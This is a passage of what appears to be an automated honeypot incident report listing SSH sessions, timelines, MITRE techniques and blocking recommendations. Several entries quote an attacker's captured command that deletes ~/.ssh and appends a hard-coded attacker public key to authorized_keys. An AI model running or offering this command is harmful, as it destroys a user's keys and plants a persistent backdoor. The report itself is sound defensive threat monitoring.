**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:12:31` | `cowrie.session.connect` |
| `2026-04-10 05:12:31` | `cowrie.client.version` |
| `2026-04-10 05:12:31` | `cowrie.client.kex` |
| `2026-04-10 05:12:32` | `cowrie.login.success` |
| `2026-04-10 05:12:33` | `cowrie.session.params` |
| `2026-04-10 05:12:33` | `cowrie.command.input` |
| `2026-04-10 05:12:33` | `cowrie.command.failed` |
| `2026-04-10 05:12:33` | `cowrie.log.closed` |
| `2026-04-10 05:12:34` | `cowrie.session.params` |
| `2026-04-10 05:12:34` | `cowrie.command.input` |
| `2026-04-10 05:12:34` | `cowrie.session.file_download` |
| `2026-04-10 05:12:34` | `cowrie.log.closed` |
| `2026-04-10 05:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e04bdf12bbbd

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:12 |
| **Last Seen** | 2026-04-10 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:12:37` | `cowrie.session.connect` |
| `2026-04-10 05:12:37` | `cowrie.client.version` |
| `2026-04-10 05:12:37` | `cowrie.client.kex` |
| `2026-04-10 05:12:38` | `cowrie.login.success` |
| `2026-04-10 05:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce2a113e66d0

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:14 |
| **Last Seen** | 2026-04-10 05:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:14:16` | `cowrie.session.connect` |
| `2026-04-10 05:14:16` | `cowrie.client.version` |
| `2026-04-10 05:14:17` | `cowrie.client.kex` |
| `2026-04-10 05:14:18` | `cowrie.login.success` |
| `2026-04-10 05:14:18` | `cowrie.session.params` |
| `2026-04-10 05:14:18` | `cowrie.command.input` |
| `2026-04-10 05:14:18` | `cowrie.command.failed` |
| `2026-04-10 05:14:18` | `cowrie.log.closed` |
| `2026-04-10 05:14:19` | `cowrie.session.params` |
| `2026-04-10 05:14:19` | `cowrie.command.input` |
| `2026-04-10 05:14:19` | `cowrie.session.file_download` |
| `2026-04-10 05:14:19` | `cowrie.log.closed` |
| `2026-04-10 05:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d81d650ff1e0

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:14 |
| **Last Seen** | 2026-04-10 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:14:22` | `cowrie.session.connect` |
| `2026-04-10 05:14:22` | `cowrie.client.version` |
| `2026-04-10 05:14:22` | `cowrie.client.kex` |
| `2026-04-10 05:14:23` | `cowrie.login.success` |
| `2026-04-10 05:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e81bb117a6c

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:16 |
| **Last Seen** | 2026-04-10 05:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:16:06` | `cowrie.session.connect` |
| `2026-04-10 05:16:06` | `cowrie.client.version` |
| `2026-04-10 05:16:06` | `cowrie.client.kex` |
| `2026-04-10 05:16:07` | `cowrie.login.success` |
| `2026-04-10 05:16:08` | `cowrie.session.params` |
| `2026-04-10 05:16:08` | `cowrie.command.input` |
| `2026-04-10 05:16:08` | `cowrie.command.failed` |
| `2026-04-10 05:16:08` | `cowrie.log.closed` |
| `2026-04-10 05:16:09` | `cowrie.session.params` |
| `2026-04-10 05:16:09` | `cowrie.command.input` |
| `2026-04-10 05:16:09` | `cowrie.session.file_download` |
| `2026-04-10 05:16:09` | `cowrie.log.closed` |
| `2026-04-10 05:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b6f4b29949

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:16 |
| **Last Seen** | 2026-04-10 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:16:12` | `cowrie.session.connect` |
| `2026-04-10 05:16:12` | `cowrie.client.version` |
| `2026-04-10 05:16:12` | `cowrie.client.kex` |
| `2026-04-10 05:16:13` | `cowrie.login.success` |
| `2026-04-10 05:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87518ca66af7

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:21 |
| **Last Seen** | 2026-04-10 05:22 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:21:41` | `cowrie.session.connect` |
| `2026-04-10 05:21:41` | `cowrie.client.version` |
| `2026-04-10 05:21:41` | `cowrie.client.kex` |
| `2026-04-10 05:21:44` | `cowrie.login.success` |
| `2026-04-10 05:21:45` | `cowrie.session.params` |
| `2026-04-10 05:21:45` | `cowrie.command.input` |
| `2026-04-10 05:21:45` | `cowrie.command.failed` |
| `2026-04-10 05:21:54` | `cowrie.log.closed` |
| `2026-04-10 05:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4863ae303e37

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:21 |
| **Last Seen** | 2026-04-10 05:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:21:57` | `cowrie.session.connect` |
| `2026-04-10 05:21:57` | `cowrie.client.version` |
| `2026-04-10 05:21:58` | `cowrie.client.kex` |
| `2026-04-10 05:22:00` | `cowrie.login.success` |
| `2026-04-10 05:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73bf255a0b03

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:23 |
| **Last Seen** | 2026-04-10 05:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:23:34` | `cowrie.session.connect` |
| `2026-04-10 05:23:34` | `cowrie.client.version` |
| `2026-04-10 05:23:34` | `cowrie.client.kex` |
| `2026-04-10 05:23:35` | `cowrie.login.success` |
| `2026-04-10 05:23:35` | `cowrie.session.params` |
| `2026-04-10 05:23:35` | `cowrie.command.input` |
| `2026-04-10 05:23:35` | `cowrie.command.failed` |
| `2026-04-10 05:23:36` | `cowrie.log.closed` |
| `2026-04-10 05:23:36` | `cowrie.session.params` |
| `2026-04-10 05:23:36` | `cowrie.command.input` |
| `2026-04-10 05:23:36` | `cowrie.session.file_download` |
| `2026-04-10 05:23:36` | `cowrie.log.closed` |
| `2026-04-10 05:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0835e6cc20

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:23 |
| **Last Seen** | 2026-04-10 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:23:40` | `cowrie.session.connect` |
| `2026-04-10 05:23:40` | `cowrie.client.version` |
| `2026-04-10 05:23:40` | `cowrie.client.kex` |
| `2026-04-10 05:23:41` | `cowrie.login.success` |
| `2026-04-10 05:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-160efe9fb4e2

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:25 |
| **Last Seen** | 2026-04-10 05:25 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:25:09` | `cowrie.session.connect` |
| `2026-04-10 05:25:09` | `cowrie.client.version` |
| `2026-04-10 05:25:09` | `cowrie.client.kex` |
| `2026-04-10 05:25:12` | `cowrie.login.success` |
| `2026-04-10 05:25:13` | `cowrie.session.params` |
| `2026-04-10 05:25:13` | `cowrie.command.input` |
| `2026-04-10 05:25:13` | `cowrie.command.failed` |
| `2026-04-10 05:25:14` | `cowrie.log.closed` |
| `2026-04-10 05:25:15` | `cowrie.session.params` |
| `2026-04-10 05:25:15` | `cowrie.command.input` |
| `2026-04-10 05:25:15` | `cowrie.session.file_download` |
| `2026-04-10 05:25:15` | `cowrie.log.closed` |
| `2026-04-10 05:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eccb707cd10a

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:25 |
| **Last Seen** | 2026-04-10 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:25:21` | `cowrie.session.connect` |
| `2026-04-10 05:25:21` | `cowrie.client.version` |
| `2026-04-10 05:25:22` | `cowrie.client.kex` |
| `2026-04-10 05:25:24` | `cowrie.login.success` |
| `2026-04-10 05:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb4ef6b7725

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:27 |
| **Last Seen** | 2026-04-10 05:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:27:08` | `cowrie.session.connect` |
| `2026-04-10 05:27:08` | `cowrie.client.version` |
| `2026-04-10 05:27:08` | `cowrie.client.kex` |
| `2026-04-10 05:27:09` | `cowrie.login.success` |
| `2026-04-10 05:27:10` | `cowrie.session.params` |
| `2026-04-10 05:27:10` | `cowrie.command.input` |
| `2026-04-10 05:27:10` | `cowrie.command.failed` |
| `2026-04-10 05:27:10` | `cowrie.log.closed` |
| `2026-04-10 05:27:10` | `cowrie.session.params` |
| `2026-04-10 05:27:10` | `cowrie.command.input` |
| `2026-04-10 05:27:11` | `cowrie.session.file_download` |
| `2026-04-10 05:27:11` | `cowrie.log.closed` |
| `2026-04-10 05:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f74969336a

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:27 |
| **Last Seen** | 2026-04-10 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:27:14` | `cowrie.session.connect` |
| `2026-04-10 05:27:14` | `cowrie.client.version` |
| `2026-04-10 05:27:14` | `cowrie.client.kex` |
| `2026-04-10 05:27:15` | `cowrie.login.success` |
| `2026-04-10 05:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38f7fa3974a

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:28 |
| **Last Seen** | 2026-04-10 05:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:28:59` | `cowrie.session.connect` |
| `2026-04-10 05:28:59` | `cowrie.client.version` |
| `2026-04-10 05:28:59` | `cowrie.client.kex` |
| `2026-04-10 05:29:00` | `cowrie.login.success` |
| `2026-04-10 05:29:01` | `cowrie.session.params` |
| `2026-04-10 05:29:01` | `cowrie.command.input` |
| `2026-04-10 05:29:01` | `cowrie.command.failed` |
| `2026-04-10 05:29:01` | `cowrie.log.closed` |
| `2026-04-10 05:29:02` | `cowrie.session.params` |
| `2026-04-10 05:29:02` | `cowrie.command.input` |
| `2026-04-10 05:29:02` | `cowrie.session.file_download` |
| `2026-04-10 05:29:02` | `cowrie.log.closed` |
| `2026-04-10 05:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b99f49dc7d5

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:29 |
| **Last Seen** | 2026-04-10 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:29:05` | `cowrie.session.connect` |
| `2026-04-10 05:29:05` | `cowrie.client.version` |
| `2026-04-10 05:29:05` | `cowrie.client.kex` |
| `2026-04-10 05:29:06` | `cowrie.login.success` |
| `2026-04-10 05:29:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63f6b69ffc61

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:32 |
| **Last Seen** | 2026-04-10 05:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:32:38` | `cowrie.session.connect` |
| `2026-04-10 05:32:38` | `cowrie.client.version` |
| `2026-04-10 05:32:38` | `cowrie.client.kex` |
| `2026-04-10 05:32:39` | `cowrie.login.success` |
| `2026-04-10 05:32:39` | `cowrie.session.params` |
| `2026-04-10 05:32:39` | `cowrie.command.input` |
| `2026-04-10 05:32:39` | `cowrie.command.failed` |
| `2026-04-10 05:32:40` | `cowrie.log.closed` |
| `2026-04-10 05:32:40` | `cowrie.session.params` |
| `2026-04-10 05:32:40` | `cowrie.command.input` |
| `2026-04-10 05:32:40` | `cowrie.session.file_download` |
| `2026-04-10 05:32:40` | `cowrie.log.closed` |
| `2026-04-10 05:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ba094974615

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:32 |
| **Last Seen** | 2026-04-10 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:32:43` | `cowrie.session.connect` |
| `2026-04-10 05:32:43` | `cowrie.client.version` |
| `2026-04-10 05:32:44` | `cowrie.client.kex` |
| `2026-04-10 05:32:45` | `cowrie.login.success` |
| `2026-04-10 05:32:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e42e6eaaaabc

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-10 05:36 |
| **Last Seen** | 2026-04-10 05:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
